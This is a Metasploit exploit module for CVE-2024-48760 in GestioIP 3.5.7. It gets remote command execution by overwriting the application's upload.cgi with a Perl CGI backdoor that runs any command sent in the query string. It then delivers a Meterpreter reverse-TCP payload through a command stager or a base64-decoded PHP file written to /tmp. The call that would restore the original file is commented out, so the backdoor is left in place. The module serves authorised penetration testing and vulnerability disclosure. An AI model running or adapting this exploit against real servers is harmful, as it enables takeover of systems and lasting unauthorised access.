##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Exploit::Remote
  Rank = NormalRanking

  include Msf::Exploit::Remote::HttpClient
  include Msf::Exploit::CmdStager

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'GestioIP 3.5.7 Remote Command Execution',
        'Description' => %q{
          This module exploits a command execution via file upload.
          If GestioIP is configured to use no authentication for admin account,
          no password is required to exploit the vulnerability. Otherwise, an authenticated
          user with admin right on the web site is required to exploit.
        },
        'License' => MSF_LICENSE,
        'Author' => [
          'maxibelino', # Original finder of CVE-2024-48760
          'odeez24' # Metasploit module
        ],
        'References' => [
          [ 'CVE', '2024-48760' ],
          [ 'URL', 'https://github.com/maxibelino/CVEs/tree/main/CVE-2024-48760']
        ],
        'Platform' => [ 'unix' ],
        'Arch' => ARCH_CMD,
        'Targets' => [
          [
            'Linux/unix Command',
            {
              'Arch' => [ ARCH_X86, ARCH_X64 ],
              'Platform' => ['linux'],
              'DefaultOptions' => {
                'PAYLOAD' => 'linux/x64/meterpreter/reverse_tcp'
              },
              'CmdStagerFlavor' => [ 'printf', 'echo', 'bourne' ]
            }
          ],
          [
            'PHP Meterpreter',
            {
              'Arch' => [ ARCH_PHP ],
              'Platform' => ['php'],
              'DefaultOptions' => {
                'PAYLOAD' => 'php/meterpreter/reverse_tcp'
              },
              'CmdStagerFlavor' => [ 'php_mkdir', 'php_base64']
            }
          ]
        ],
        'Privileged' => true,
        'DisclosureDate' => '2025-01-14',
        'DefaultTarget' => 0,
        'Notes' => {
          'Reliability' => UNKNOWN_RELIABILITY,
          'Stability' => UNKNOWN_STABILITY,
          'SideEffects' => UNKNOWN_SIDE_EFFECTS
        }
      )
    )

    register_options(
      [
        OptString.new('HttpUsername', [true, 'The username to auth as with admin right', 'gipadmin']),
        OptString.new('HttpPassword', [true, 'The password to auth with', '']),
      ]
    )
  end

  def post_auth?
    true
  end

  def target_link
    '/api/upload.cgi'
  end

  def user
    datastore['HttpUsername']
  end

  def pass
    datastore['HttpPassword']
  end

  def use_auth
    !(pass.nil? or pass.empty?)
  end

  def backdoor_content
    <<~PERL
      #!/usr/bin/perl -w

      use strict;

      print "Cache-Control: no-cache\n";
      print "Content-type: text/html\n\n";

      my $req = $ENV{QUERY_STRING};
      chomp ($req);
      $req =~ s/%20/ /g;
      $req =~ s/%3b/;/g;
      $req =~ s/%7c/|/gi;
      $req =~ s/%27/'/g;    # Converts %27 into '
      $req =~ s/%22/"/g;
      $req =~ s/%5D/]/g;
      $req =~ s/%5B/[/g;

      print "<html><body>";

      print '<!-- CGI backdoor -->';

        if (!$req) {
          print "Usage: http://domain/gestioip/api/upload.cgi?whoami";
        }
        else {
          print "Executing: $req";
        }

        print "<pre>";
        my @cmd = `$req`;
        print "</pre>";

        foreach my $line (@cmd) {
          print $line . "<br/>";
        }

        print "</body></html>";
    PERL
  end

  def original_upload
    <<~PERL
      #!/usr/bin/perl

      use Cwd;
      use CGI;

      my $debug = 1;
      my $q = new CGI;

      my ($status, $message, $exit);
      my $output_type_header = "text/xml";
      $exit = 0;

      my $filename = $q->param("file_name") || "";

      print STDERR "FOUND FILENAME: $filename\n" if $debug;

      if ( $filename !~ /^[A-Za-z0-9-_.]+$/ ){
        $message = "ERROR: only the following characters are allowed for file_name: A-Z,a-z,0-9,-,_,.";
        $status ="400 Bad Request";
        $exit = 1;
        printResponse(
          message   => "$message",
          status => "$status",
          exit => "$exit",
        );
      }

      $POST_MAX=1024 * 10000;  # 10MB max
      my $content_length = defined $ENV{'CONTENT_LENGTH'} ? $ENV{'CONTENT_LENGTH'} : 0;
      if (($POST_MAX > 0) && ($content_length > $POST_MAX)) {
          $message = "ERROR: Upload is limited to a file size of max. 10MB";#{'	'}
          print STDERR "$message\n" if $debug;
          $status ="500 Internal Server Error";
          $exit = 1;
          printResponse(
            message   => "$message",
            status => "$status",
            exit => "$exit",
          );
      }

      my $lightweight_fh  = $q->upload('leases_file');



      if (defined $lightweight_fh) {

        print STDERR "HANDLE DEFINED\n" if $debug;

        # Upgrade the handle to one compatible with IO::Handle:
        my $io_handle = $lightweight_fh->handle;

        my $file = '/usr/share/gestioip/var/data/' . $filename;
        open (OUTFILE,'>', "$filename") or $message = "ERROR: can not open file to write: $!";

        if ( $message ) {
          print STDERR "$message\n" if $debug;
          $status ="500 Internal Server Error";
          $exit = 1;
          printResponse(
            message   => "$message",
            status => "$status",
            exit => "$exit",
          );
        }

        while ($bytesread = $io_handle->read($buffer,1024)) {
          print OUTFILE $buffer;
        }

        close OUTFILE;

      } else {
        print STDERR "NO HANDLE DEFINED\n" if $debug;
        $message = "ERROR: No leases file received";
        $status ="400 Bad Request";
        $exit = 1;
        printResponse(
          message   => "$message",
          status => "$status",
          exit => "$exit",
        );
      }


      $status ="200 OK";
      printResponse(
        message   => "OK",
        status => "$status",
        exit => "$exit",
      );



      ###################
      #### Subroutines
      ###################

      sub printResponse {
          my %args = @_;

          my $status = $args{status} || "";
          my $message = $args{message} || "";
          my $exit = $args{exit} || 0;

        my $output = "";
        $output .= "<?xml version='1.0' encoding='UTF-8'?>\n";
        $output .= "<Result>\n";
        $output .= "    <Message>$message</Message>\n";
        $output .= "</Result>\n";

        printHtmlHeader(
          type   => "$output_type_header",
          status => "200 OK",
        );

        print $output;

        exit $exit;
      }

      sub printHtmlHeader {
          my %args = @_;

          my $type = $args{type} || "";
          $type = "-type => \"$type\"" if $type;
          my $status = $args{status} || "";
          $status = "-status => \"$status\"" if $status;

          my $header_params = $type . "," . $allow . "," . $location . "," . $status;
          $header_params =~ s/^,//;
          $header_params =~ s/,$//;

          print $q->header( eval($header_params) );
      }
      #curl \
      #  -F "userid=1" \
      #  -F "filecomment=This is an image file" \
      #  -F "image=@/home/user1/Desktop/test.jpg" \
      #  localhost/uploader.php
    PERL
  end

  # Execute command on the target server
  #
  # @param cmd [String] the command to execute
  def execute_command(cmd, _opts = {})
    encoded_cmd = Rex::Text.uri_encode(cmd)
    res = send_request_cgi({
      'method' => 'GET',
      'uri' => normalize_uri(target_uri.path, target_link),
      'authorization' => basic_auth(user, pass),
      'query' => encoded_cmd
    })
    return res
  end

  # Upload the file on the target_link
  #
  # @param filename [String] the filename to upload
  # @param content [String] the content
  # @return [Boolean] true if the file was successfullt upload, false otherwise.
  def upload_file(filename, content)
    data = Rex::MIME::Message.new
    data.add_part(
      'upload.cgi',
      nil,
      nil,
      'form-data; name="file_name"'
    )
    data.add_part(
      content,
      'application/x-httpd-cgi',
      nil,
      "form-data; name=\"leases_file\"; filename=\"#{filename}\""
    )

    res = send_request_cgi({
      'method' => 'POST',
      'uri' => normalize_uri(target_uri.path, target_link),
      'ctype' => "multipart/form-data; boundary=#{data.bound}",
      'data' => data.to_s,
      'authorization' => basic_auth(user, pass)
    })
    if res && res.code == 200
      if res.body.include?('ERROR')
        return false
      end

      return true
    elsif res.code == 401
      print_error('Authentification refused, Please give valid admin login informations')
      return false
    else
      return false
    end
  end

  def check_execution
    test_cmd = 'whoami'
    res = execute_command(test_cmd)
    return false if res.nil?

    if res.body.include?('ERROR')
      print_error('.')
      return false
    else
      return true
    end
  end

  # Execute PHP code on the target server in order to run the payload
  def execute_php
    b64_payload = Rex::Text.encode_base64(payload.encoded)
    filename = "/tmp/#{Rex::Text.rand_text_alpha(8)}.php"

    print_status('Uploading PHP Meterpreter payload...')

    php_cmd = "echo #{b64_payload} | base64 -d > #{filename}; php #{filename} &"
    print_status("Executing payload #{filename}...")
    execute_command(php_cmd)

    print_good('PHP Meterpreter payload executed successfully.')

    print_status("Removing payload file: #{filename}")
    execute_command("rm #{filename}")
  end

  # Upload the payload to the target server
  def execute_linux
    print_status('Uploading payload to the target server...')

    execute_cmdstager(
      linemax: 500,
      nodelete: false,
      background: true,
      temp: '/tmp'
    )

    print_good('Payload uploaded successfully.')
  end

  def clean_upload(original_content)
    print_status('Upload the original upload file')
    res = upload_file('upload.cgi', original_content)
    if (!res)
      print_error('Unable to upload the original file')
    end

    print_status("Cleaning up #{target_link} to remove backdoor ...")
  end

  def exploit
    print_status('Upload the backdoor file ...')
    res = upload_file('upload.cgi', backdoor_content)
    if (!res)
      fail_with(Failure::NotVulnerable, 'Unable to upload the backdoor file')
    end
    print_good('Backdoor file successfuly upload')
    unless check_execution
      fail_with(Failure::NotVulnerable, 'Command execution failed. The exploit was not successful.')
    end

    case target.name
    when 'Linux/unix Command'
      execute_linux
    when 'PHP Meterpreter'
      execute_php
    end
    # clean_upload(original_upload)
  end
end
